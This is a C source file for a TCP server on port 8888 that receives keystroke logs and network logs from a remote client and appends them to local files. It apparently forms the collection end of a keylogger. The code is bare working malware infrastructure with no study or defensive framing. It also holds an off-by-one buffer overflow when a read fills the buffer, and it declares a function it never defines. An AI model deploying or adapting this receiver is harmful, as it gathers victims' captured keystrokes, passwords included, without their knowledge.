#include <stdio.h>
#include <stdlib.h>
#include <string.h>       // strlen
#include <sys/socket.h>   // socket
#include <arpa/inet.h>    // inet_addr
#include <unistd.h>       // write
#include <fcntl.h>

#define BUFFER_SIZE 2000

int ends_with(const char *str, const char *suffix);

int main()
{
    // Variables
    int ssock, csock, addrlen;
    struct sockaddr_in server, client;
    char rec_buffer[BUFFER_SIZE];
    short port = 8888;  //TCP port
    
    // Create a socket. Return value is a file descriptor for the socket.
    ssock = socket(AF_INET, SOCK_STREAM, 0);
    if (ssock == -1) {
        perror("Error creating socket\n");
        exit(0);
    }
    printf("Server socket created\n");
    
    // Set the server ip address, connection family and port. INADDR_ANY means
    // all the ip addresses of the server can be used to set up connection.
    server.sin_family      = AF_INET;
    server.sin_addr.s_addr = INADDR_ANY/*inet_addr("127.0.0.1")*/;
    server.sin_port        = htons(port);
    
    // Bind the socket for the connection
    if (bind(ssock, (struct sockaddr *) &server, sizeof(server)) < 0) {

        perror("Error binding\n");
        close(ssock);
        exit(0);
    }
    printf("Binding done\n");
    
    // Listen for incoming connections
    listen(ssock, SOMAXCONN);
    printf("Listening...\n");
    
    printf("Waiting for incoming connections...\n");
    addrlen = sizeof(struct sockaddr_in);
    
    // Accept connection from an incoming client
    csock = accept(ssock, (struct sockaddr *) &client, (socklen_t *) &addrlen);
    if (csock < 0) {
        perror("Error accepting connections\n");
        exit(0);
    }
    printf("Connection accepted\n");
    
    /*** Reading from Client and writing to local files* ***/
    ssize_t read_size;
    while(1){
        memset(rec_buffer, 0, sizeof(rec_buffer));  //clear rec_buffer
        /*Open keylog files for printing*/
        FILE *keylog_log = fopen("./keylog_received.txt", "a");
        setbuf(keylog_log, NULL);
        /*Receive a keylog file from the client*/
        while((read_size = read(csock, rec_buffer, sizeof(rec_buffer))) > 0) {
            rec_buffer[read_size] = '\0';
            char* trimmed;
            if ((trimmed = strstr(rec_buffer, "_end")) != NULL)
            {
                rec_buffer[trimmed - rec_buffer] = '\0';
                read_size = trimmed - rec_buffer;
            }

            fwrite(rec_buffer, sizeof(char), read_size, keylog_log);

            if (trimmed != NULL)
                break;
        }
        fclose(keylog_log);

        memset(rec_buffer, 0, sizeof(rec_buffer));  //clear rec_buffer
        /*Open network log file for printing*/
        FILE *network_log = fopen("./network_received.txt", "a");
        setbuf(network_log, NULL);
        /*Receive network log file*/
        while((read_size = read(csock, rec_buffer, sizeof(rec_buffer))) > 0){
            rec_buffer[read_size] = '\0';
            char* trimmed;
            if ((trimmed = strstr(rec_buffer, "_end")) != NULL)
            {
                rec_buffer[trimmed - rec_buffer] = '\0';
                read_size = trimmed - rec_buffer;
            }

            fwrite(rec_buffer, sizeof(char), read_size, network_log);

            if (trimmed != NULL)
                break;
        }
        fclose(network_log);
        
        printf("\nLog transfer complete\n");
    }
    
    close(csock);
    close(ssock);
    printf("End connection\n");
}
